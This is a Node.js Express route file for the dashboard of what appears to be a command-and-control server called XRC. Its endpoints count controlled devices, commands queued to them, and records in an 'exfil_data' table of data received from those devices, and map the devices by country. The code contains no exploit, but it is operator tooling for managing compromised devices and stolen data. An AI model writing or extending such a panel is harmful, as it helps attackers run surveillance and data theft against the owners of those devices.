// ============================================================
// FILE: XRC/server/src/routes/dashboard.js
// ============================================================
const express = require('express');
const { getDatabase } = require('../db/database');

const router = express.Router();

/**
 * GET /api/dashboard/summary
 * Quick summary for dashboard header cards.
 */
router.get('/summary', (req, res) => {
    try {
        const db = getDatabase();

        const totalDevices = db.prepare('SELECT COUNT(*) as count FROM devices').get().count;
        const onlineNow = db.prepare('SELECT COUNT(*) as count FROM devices WHERE is_online = 1').get().count;
        const newToday = db.prepare(
            "SELECT COUNT(*) as count FROM devices WHERE first_seen > strftime('%s','now','-1 day')"
        ).get().count;
        const commandsToday = db.prepare(
            "SELECT COUNT(*) as count FROM commands WHERE created_at > strftime('%s','now','-1 day')"
        ).get().count;
        const exfilToday = db.prepare(
            "SELECT COUNT(*) as count FROM exfil_data WHERE received_at > strftime('%s','now','-1 day')"
        ).get().count;
        const pendingCommands = db.prepare("SELECT COUNT(*) as count FROM commands WHERE status = 'pending'").get().count;

        // Unique types of exfil data
        const exfilTypes = db.prepare('SELECT DISTINCT type FROM exfil_data').all().map(r => r.type);

        res.json({
            total_devices: totalDevices,
            online_now: onlineNow,
            new_today: newToday,
            commands_today: commandsToday,
            exfil_today: exfilToday,
            pending_commands: pendingCommands,
            exfil_types: exfilTypes,
            timestamp: Date.now()
        });
    } catch (err) {
        console.error('Dashboard summary error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * GET /api/dashboard/activity-timeline
 * Activity timeline for the dashboard feed.
 */
router.get('/activity-timeline', (req, res) => {
    try {
        const db = getDatabase();
        const { limit } = req.query;
        const pageLimit = parseInt(limit) || 30;

        const events = db.prepare(`
            SELECT 'device_online' as type, device_id, last_seen as ts, model, alias FROM devices WHERE is_online = 1
            UNION ALL
            SELECT 'device_offline' as type, device_id, last_seen as ts, model, alias FROM devices WHERE is_online = 0 AND last_seen > strftime('%s','now','-7 days')
            UNION ALL
            SELECT 'command_sent' as type, device_id, created_at as ts, action as model, status as alias FROM commands
            UNION ALL
            SELECT 'exfil_received' as type, device_id, received_at as ts, type as model, '' as alias FROM exfil_data
            ORDER BY ts DESC LIMIT ?
        `).all(pageLimit);

        res.json({ events, limit: pageLimit });
    } catch (err) {
        console.error('Activity timeline error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * GET /api/dashboard/heatmap
 * Connected devices heatmap data (by country).
 */
router.get('/heatmap', (req, res) => {
    try {
        const db = getDatabase();
        const devices = db.prepare('SELECT country, COUNT(*) as count FROM devices WHERE country IS NOT NULL GROUP BY country').all();
        const total = devices.reduce((acc, d) => acc + d.count, 0);
        res.json({ countries: devices, total });
    } catch (err) {
        console.error('Heatmap error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

/**
 * GET /api/dashboard/logs
 * System logs.
 */
router.get('/logs', (req, res) => {
    try {
        const db = getDatabase();
        const { level, limit, offset } = req.query;

        let query = 'SELECT * FROM logs WHERE 1=1';
        const params = [];

        if (level) { query += ' AND level = ?'; params.push(level); }
        query += ' ORDER BY created_at DESC';
        query += ` LIMIT ${parseInt(limit) || 100} OFFSET ${parseInt(offset) || 0}`;

        const logs = db.prepare(query).all(...params);
        const total = db.prepare('SELECT COUNT(*) as count FROM logs').get().count;

        res.json({ logs, total });
    } catch (err) {
        console.error('Logs error:', err);
        res.status(500).json({ error: 'Internal server error' });
    }
});

module.exports = router;
